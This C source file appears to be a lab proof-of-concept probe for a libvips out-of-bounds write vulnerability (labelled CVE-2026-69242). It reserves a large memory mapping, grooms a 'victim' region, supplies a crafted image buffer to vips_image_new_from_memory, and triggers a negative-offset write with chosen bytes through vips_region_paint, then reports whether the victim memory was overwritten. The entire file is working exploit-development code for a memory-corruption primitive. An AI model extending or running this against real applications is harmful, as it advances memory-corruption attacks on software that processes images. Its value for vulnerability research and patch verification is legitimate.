/* Lab-only external-buffer probe for CVE-2026-69242 (W9).
 *
 * W8 measured a 2 GiB wake-cgroup limit and noted that libvips's own
 * vips_tracked_aligned_alloc() eagerly memsets a whole multi-GB block. That
 * blocks the loader's own allocation, but not an application-supplied image
 * buffer. This probe reserves an 8.6 GB PROT_NONE MAP_NORESERVE mapping,
 * makes just a 64 KiB victim page block and a 256 KiB image area writable, and
 * passes the pointer to vips_image_new_from_memory() with the TIFF-accepted
 * geometry. vips_region_prepare() + vips_region_paint() then exercise the
 * public-API negative-offset write with chosen ink.
 *
 * No libvips-owned multi-GB memset, no wire, no command, no marker, no
 * pointer target. The victim is explicit grooming, as in W6.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <vips/vips.h>

#define LINE_SZ 4294960000ULL
#define IMAGE_SZ 8589920000ULL
#define NEG_OFF 7296
#define VICTIM_SZ 65536
#define DATA_PAGES 64

int
main(int argc, char **argv)
{
	unsigned char *base, *victim, *data;
	size_t off;
	VipsImage *im;
	VipsRegion *reg;
	VipsRect r = { 0, 0, 4, 2 };
	int rc;

	if (VIPS_INIT(argv[0]))
		return 1;

	base = mmap(NULL, IMAGE_SZ + DATA_PAGES, PROT_NONE,
		MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
	if (base == MAP_FAILED) {
		printf("RESERVE=ERR errno=%d\n", errno);
		return 2;
	}
	victim = base;
	data = base + VICTIM_SZ + 32;
	off = (size_t) (data - NEG_OFF - base);
	if (mprotect(victim, VICTIM_SZ, PROT_READ | PROT_WRITE) ||
		mprotect(base + VICTIM_SZ, DATA_PAGES * 4096,
			PROT_READ | PROT_WRITE)) {
		printf("MPROTECT=ERR errno=%d\n", errno);
		return 2;
	}
	memset(victim, 0x11, VICTIM_SZ);
	printf("RESERVE base=%p data=%p victim=%p off=%zu pre=%02x "
		"image=%llu line=%llu\n",
		(void *) base, (void *) data, (void *) victim, off,
		victim[off], (unsigned long long) IMAGE_SZ,
		(unsigned long long) LINE_SZ);
	fflush(stdout);

	im = vips_image_new_from_memory(data, IMAGE_SZ,
		107374, 2, 10000, VIPS_FORMAT_UINT);
	if (!im) {
		printf("IMAGE=ERR msg=%s\n", vips_error_buffer());
		vips_error_clear();
		return 0;
	}
	printf("IMAGE_OK sizeof_line=%llu sizeof_image=%llu data=%p\n",
		(unsigned long long) VIPS_IMAGE_SIZEOF_LINE(im),
		(unsigned long long) VIPS_IMAGE_SIZEOF_IMAGE(im),
		(void *) im->data);
	fflush(stdout);

	reg = vips_region_new(im);
	rc = vips_region_prepare(reg, &r);
	printf("PAINT_PREPARE=%d bpl=%d lskip=%llu\n", rc, reg->bpl,
		(unsigned long long) VIPS_REGION_LSKIP(reg));
	fflush(stdout);
	if (rc == 0 && reg->valid.height >= 2) {
		printf("PAINT_ADDR1=%p\n",
			(void *) VIPS_REGION_ADDR(reg, 0, 1));
		fflush(stdout);
		vips_region_paint(reg, &r, 0x5a);
		printf("PAINT_DONE\n");
		fflush(stdout);
	}
	printf("VICTIM_POST off=%zu byte0=%02x byte1=%02x before=%02x "
		"after_end=%02x\n",
		off, victim[off], victim[off + 1],
		off ? victim[off - 1] : 0, victim[VICTIM_SZ - 1]);
	fflush(stdout);

	g_object_unref(reg);
	g_object_unref(im);
	vips_shutdown();
	return 0;
}
